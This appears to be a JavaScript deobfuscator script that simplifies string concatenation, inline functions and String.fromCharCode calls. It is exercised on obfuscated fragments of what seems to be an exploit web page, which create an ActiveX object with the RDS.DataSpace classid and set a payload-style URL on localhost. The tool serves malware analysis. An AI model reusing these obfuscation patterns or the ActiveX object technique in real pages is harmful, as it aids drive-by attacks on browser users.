const r_extractVar = /([a-zA-Z][^ ,]*)\s?=\s?((["'`].*?["'`])|(.*))/g;

const r_simplify_function_return = /\(function\s?\(\)\s?{\s*?return\s?(.*?)[;]?\s?}\)\(\)/g;
const r_simplify_add_str = /["'`](.*?)["'`]\s?\+\s?["'`](.*?)["'`]/g;
const r_simplify_fromcharcode = /String.fromCharCode\(([0-9a-fA-F,x]*?)\)/g;

const stringify = (content) => {
  let type = `'`;

  // if (type === `'` && content.includes(`'`)) type = '"';
  // if (type === '"' && content.includes(`"`)) type = '`';

  return type + content + type;
};

const deobf = (source, sub = false) => {
  const original = source;

  const vars = [];

  let varSource = source;
  while (r_extractVar.test(varSource)) {
    varSource = varSource.replace(r_extractVar, (_, name, value) => {
      // console.log([name, value]);

      vars.push([name, value]);

      return value;
    });
  }

  for (const [ name, value ] of vars) {
    if (value[0] !== `'` && value[0] !== `"` && value[0] !== '`') continue;

    console.log(name, value);

    let didSomething = false;

    source = source.replace(new RegExp(`(${name})\\s?[^=\\s]`, 'g'), (_, toReplace) => {
      didSomething = true;

      return _.replace(toReplace, value);
    });

    if (!didSomething) continue;

    source = source.replace(new RegExp(`(var|let|const)?\\s?${name}\\s?=\\s?((["'\`].*?["'\`]))[,;]?`), () => '');
  }

  source = source.replace(/^\s+\n/gm, '');

  console.log(source);

  while (r_simplify_function_return.test(source)) source = source.replace(r_simplify_function_return, (_, value) => value);

  while (r_simplify_add_str.test(source)) source = source.replace(r_simplify_add_str, (_, val1, val2) => stringify(val1 + val2));

  source = source.replace(r_simplify_fromcharcode, (_, inner) => {
    const ints = inner.split(',').map((x) => {
      const base = x[0] === '0' && x[1] !== 'x' ? 8 : undefined;

      return parseInt(x.trim(), base);
    });

    return stringify(String.fromCharCode(...ints));
  });

  if (sub) return source;
  if (!sub) source = deobf(source, true);

  // console.log('\noriginal:', '\n' + original);
  console.log('\ndeobfuscated:', '\n' + source);

  return source;
};

//deobf(`var GPSweCkB = document.createElement((function () { var XoNO="ject",apoc="ob"; return apoc+XoNO })());`);
// deobf(`GPSweCkB.setAttribute((function () { var pYmx="ssid",aTIE="a",tvPA="cl"; return tvPA+aTIE+pYmx })(), (function () { var MbWt="7566",UcNA="7",PUHo="c",yFIi="6-2F5",YXvW="sid",sYCs="E-4BAF",SZBF="9",yZMK="-AC28-CF26AA",BmVk="l",AbBB="58",iRQW="636",RQLv=":55"; return PUHo+BmVk+YXvW+RQLv+SZBF+iRQW+UcNA+yFIi+sYCs+yZMK+AbBB+MbWt })());`);
/* deobf(`var GPSweCkB = document.createElement((function () { var XoNO="ject",apoc="ob"; return apoc+XoNO })());
GPSweCkB.setAttribute((function () { var pYmx="ssid",aTIE="a",tvPA="cl"; return tvPA+aTIE+pYmx })(), (function () { var MbWt="7566",UcNA="7",PUHo="c",yFIi="6-2F5",YXvW="sid",sYCs="E-4BAF",SZBF="9",yZMK="-AC28-CF26AA",BmVk="l",AbBB="58",iRQW="636",RQLv=":55"; return PUHo+BmVk+YXvW+RQLv+SZBF+iRQW+UcNA+yFIi+sYCs+yZMK+AbBB+MbWt })());
GPSweCkB.url = String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);`); */

/* deobf(`var vqeJMM = document.createElement((function() {
  var lmuxifox = (function () { var lFuh="ect",OtcD="j"; return OtcD+lFuh })(), qvrqA = String.fromCharCode(0x6f,98);
  return qvrqA + lmuxifox;
})());`); */
deobf(`var vqeJMM = document.createElement((function() {
  var lmuxifox = (function () { var lFuh="ect",OtcD="j"; return OtcD+lFuh })(), qvrqA = String.fromCharCode(0x6f,98);
  return qvrqA + lmuxifox;
})());
vqeJMM.setAttribute((function() {
  var BrE = String.fromCharCode(115,0x73,105,100), oWnuEB = String.fromCharCode(97), bWVwPmvte = String.fromCharCode(0143,0154);
  return bWVwPmvte + oWnuEB + BrE;
})(), (function() {
  var VZKfxYVTesUuNa = String.fromCharCode(55,065,0x36,54), ANrWHzMVmQTEnX = (function () { var DsIA="7"; return DsIA })(), qnz = (function () { var uUmi="c"; return uUmi })(), plzNK = String.fromCharCode(0x36,055,062,70,0x35), brtluDTu = (function () { var eJeU="d",DJnq="si"; return DJnq+eJeU })(), AqMDLOwdJANJk = String.fromCharCode(0105,0x2d,52,0x42,0101,70), tjHrCLeCTfpRnX = (function () { var cVWQ="9"; return cVWQ })(), cwPWStJQJ = String.fromCharCode(0x2d,0x41,0103,062,0x38,0x2d,0103,0x46,062,066,65,0101), EfyYAZclv = String.fromCharCode(108), ZdLqwiaf = String.fromCharCode(53,070), IrOpZfY = (function () { var TtsU="6",kdod="63"; return kdod+TtsU })(), rOkewIqjVTn = (function () { var auio="5",JgSf=":5"; return JgSf+auio })();
  return qnz + EfyYAZclv + brtluDTu + rOkewIqjVTn + tjHrCLeCTfpRnX + IrOpZfY + ANrWHzMVmQTEnX + plzNK + AqMDLOwdJANJk + cwPWStJQJ + ZdLqwiaf + VZKfxYVTesUuNa;
})());`);